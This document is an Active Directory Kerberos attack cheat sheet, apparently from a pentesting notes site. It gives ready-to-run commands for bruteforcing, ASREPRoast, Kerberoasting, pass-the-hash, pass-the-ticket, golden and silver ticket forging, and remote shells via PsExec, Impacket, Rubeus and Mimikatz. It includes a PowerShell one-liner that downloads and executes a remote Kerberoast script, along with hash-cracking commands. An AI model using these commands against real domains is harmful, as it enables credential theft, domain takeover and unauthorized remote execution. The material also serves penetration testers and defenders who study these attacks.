# Kerberos

## Kerberos

### Info

#### How it works

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MHjR6ILX3h1MV0a0Sv_%2F-MHjTyOWhdPrhRSu_unL%2Fimagen.png?alt=media\&token=ce2a275d-19b2-44ce-8773-2bbfa64d6884)

#### Step 1

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MHjUOaIzpSuWFvJPCfI%2F-MHjUY0hEyp5K3yN3SkH%2Fimagen.png?alt=media\&token=73b45eb6-6f05-46f2-96ec-274ce5440348)

#### Step 2

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MHjUOaIzpSuWFvJPCfI%2F-MHjUaWYUyUXPQ-dMPou%2Fimagen.png?alt=media\&token=d1a04c82-846a-4946-b525-94de67fa6109)

#### Step 3

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MHjUOaIzpSuWFvJPCfI%2F-MHjUv3pUjCLdtspdcVf%2Fimagen.png?alt=media\&token=291c672c-2b83-46e0-b181-b1b3850e8aaa)

#### Step 4

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MHjUOaIzpSuWFvJPCfI%2F-MHjV5h2gmLNlVMoLtqb%2Fimagen.png?alt=media\&token=efe0a30e-a8c4-47df-b779-2e94ea10829b)

#### Step 5

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MHjUOaIzpSuWFvJPCfI%2F-MHjVDU2NARykjII9HyJ%2Fimagen.png?alt=media\&token=3f29ba8a-f15d-4820-b98b-9320eb9a433b)

### Bruteforcing

> Requirements: connection with DC/KDC.

#### Linux (external)

With [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute):

```
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>
```

#### Windows (internal)

With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:

```
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```

### ASREPRoast

> Cracking users password, with KRB\_AS\_REQ when user has DONT\_REQ\_PREAUTH attribute, KDC respond with KRB\_AS\_REP user hash and then go for cracking.

```
# LDAP filter for non preauth krb users
LDAP: (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```

#### Linux (external)

With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetNPUsers.py:

```
# check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# check ASREPRoast for a list of users (no credentials required)
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

#### Windows (internal)

With [Rubeus](https://github.com/GhostPack/Rubeus):

```
# check ASREPRoast for all users in current domain
.\Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>

# Powerview
Get-DomainUser -PreauthNotRequired

# https://github.com/HarmJ0y/ASREPRoast
```

Cracking with dictionary of passwords:

```
hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>

john --wordlist=<passwords_file> <AS_REP_responses_file>
```

### Kerberoasting

> Cracking users password from TGS, because TGS requires Service key which is derived from NTLM hash

```
# LDAP filter for users with linked services
LDAP: (&(samAccountType=805306368)(servicePrincipalName=*))
```

#### Linux (external)

With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetUserSPNs.py:

```
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
```

#### Windows (internal)

With [Rubeus](https://github.com/GhostPack/Rubeus):

```
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
```

With **Powershell**:

```
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
```

Cracking with dictionary of passwords:

```
hashcat -m 13100 --force <TGSs_file> <passwords_file>

john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
```

### Overpass The Hash/Pass The Key (PTK)

> NTDS.DIT, SAM files or lsass with mimi

#### Linux (external)

By using [Impacket](https://github.com/SecureAuthCorp/impacket) examples:

```
# Request the TGT with hash
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
# Request the TGT with password
python getTGT.py <domain_name>/<user_name>:[password]
# If not provided, password is asked

# Set the TGT for impacket use
export KRB5CCNAME=<TGT_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

#### Windows (internal)

With [Rubeus](https://github.com/GhostPack/Rubeus) and [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):

```
# Ask and inject the ticket
.\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt

# Execute a cmd in the remote machine
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

### Pass The Ticket (PTT)

> MiTM, lsass with mimi

#### Linux (external)

Check type and location of tickets:

```
grep default_ccache_name /etc/krb5.conf
```

If none return, default is FILE:/tmp/krb5cc\_%{uid}.

In case of file tickets, you can copy-paste (if you have permissions) for use them.

In case of being _KEYRING_ tickets, you can use [tickey](https://github.com/TarlogicSecurity/tickey) to get them:

```
# To dump current user tickets, if root, try to dump them all by injecting in other user processes
# to inject, copy tickey in a reachable folder by all users
cp tickey /tmp/tickey
/tmp/tickey -i
```

#### Windows (internal)

With [Mimikatz](https://github.com/gentilkiwi/mimikatz):

```
mimikatz # sekurlsa::tickets /export
```

With [Rubeus](https://github.com/GhostPack/Rubeus) in Powershell:

```
.\Rubeus dump

# After dump with Rubeus tickets in base64, to write the in a file
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<bas64_ticket>"))
```

To convert tickets between Linux/Windows format with [ticket\_converter.py](https://github.com/Zer1t0/ticket_converter):

```
# ccache (Linux), kirbi (Windows from mimi/Rubeus) 
python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi
```

#### Using ticket in Linux

With [Impacket](https://github.com/SecureAuthCorp/impacket) examples:

```
# Set the ticket for impacket use
export KRB5CCNAME=<TGT_ccache_file_path>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

#### Using ticket in Windows

Inject ticket with [Mimikatz](https://github.com/gentilkiwi/mimikatz):

```
mimikatz # kerberos::ptt <ticket_kirbi_file>
```

Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus):

```
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):

```
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

### Silver ticket

> Build a TGS with Service key

#### Linux (external)

With [Impacket](https://github.com/SecureAuthCorp/impacket) examples:

```
# To generate the TGS with NTLM
python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# To generate the TGS with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

#### Windows (internal)

With [Mimikatz](https://github.com/gentilkiwi/mimikatz):

```
# To generate the TGS with NTLM
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 128 key
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# Inject TGS with Mimikatz
mimikatz # kerberos::ptt <ticket_kirbi_file>
```

Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus):

```
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):

```
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

### Golden ticket

> Build a TGT with NTLM hash and krbtgt key, valid until krbtgt password is changed or TGT expires

Tickets must be used right after created

#### Linux (external)

With [Impacket](https://github.com/SecureAuthCorp/impacket) examples:

```
# To generate the TGT with NTLM
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# To generate the TGT with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

#### Windows (internal)

With [Mimikatz](https://github.com/gentilkiwi/mimikatz):

```
# To generate the TGT with NTLM
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>

# To generate the TGT with AES 128 key
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>

# To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>

# Inject TGT with Mimikatz
mimikatz # kerberos::ptt <ticket_kirbi_file>
```

Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus):

```
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):

```
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

### Misc

To get NTLM from password:

```
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
```

### Delegation

> Allows a service impersonate the user to interact with a second service, with the privileges and permissions of the user
>
> * If a user has delegation capabilities, all its services (and processes) have delegation capabilities.
> * KDC only worries about the user who is talking to, not the process.
> * Any process belonging to the same user can perform the same actions in Kerberos, regardless of whether it is a service or not.
> * Unable to delegate if NotDelegated (or ADS\_UF\_NOT\_DELEGATED) flag is set in the User-Account-Control attribute of the user account or user in Protected Users group.

#### Unconstrained delegation

1. _User1_ requests a TGS for _ServiceZ_, of _UserZ_.
2. The KDC checks if _UserZ_ has the _TrustedForDelegation_ flag set (Yes).
3. The KDC includes a TGT of _User1_ inside the TGS for _ServiceZ_.
4. _ServiceZ_ receives the TGS with the TGT of _User1_ included and stores it for later use.

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MHjzqJMdtof3HGCZXsn%2F-MHk-8__qI4BpTE5vYQe%2Fimagen.png?alt=media\&token=ce11cdac-68c4-4fd3-8315-72e15b49ccc8)

#### Contrained delegation and RBCD (Resource Based Constrained Delegation)

Delegation is constrained to only some whitelisted third-party services.

* S4U2Proxy Contrained

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MHjzqJMdtof3HGCZXsn%2F-MHk5NRh-1DRi2PSlOg9%2Fimagen.png?alt=media\&token=2c85809e-90f7-4e32-be25-68acca688de6)

* S4U2Proxy RBCD

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MHjzqJMdtof3HGCZXsn%2F-MHk5oJIAk68yBYKG-ZU%2Fimagen.png?alt=media\&token=6518a297-5d4d-4e29-906a-f37499859f5d)

* S4U2Proxy Service Name Change

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MHjzqJMdtof3HGCZXsn%2F-MHk6HBbfqktEqOW16V-%2Fimagen.png?alt=media\&token=27ea4e62-c7e4-429a-802a-85d200fc7945)

* S4U2Self

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MHjzqJMdtof3HGCZXsn%2F-MHk6Pyr1-q-LcNlMiO4%2Fimagen.png?alt=media\&token=d59a848e-0a38-4150-a898-af85aa3282f5)

* S4U2Self & S4U2Proxy combined Contrained

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MHjzqJMdtof3HGCZXsn%2F-MHk6fK3Q_qZC3MccOrs%2Fimagen.png?alt=media\&token=cc53da4c-7853-4969-bacb-c7681aeef3d8)

* S4U2Self & S4U2Proxy combined RBCD

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MHjzqJMdtof3HGCZXsn%2F-MHk6qTPb1oT1Dk3szZ6%2Fimagen.png?alt=media\&token=5917d3a6-bc9e-47da-8f61-c10275850f83)

* RBCD attack

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MHjzqJMdtof3HGCZXsn%2F-MHk7uW8OVdAvUHANaNU%2Fimagen.png?alt=media\&token=5d1adf66-68de-43d6-96a6-dd3269e14f21)
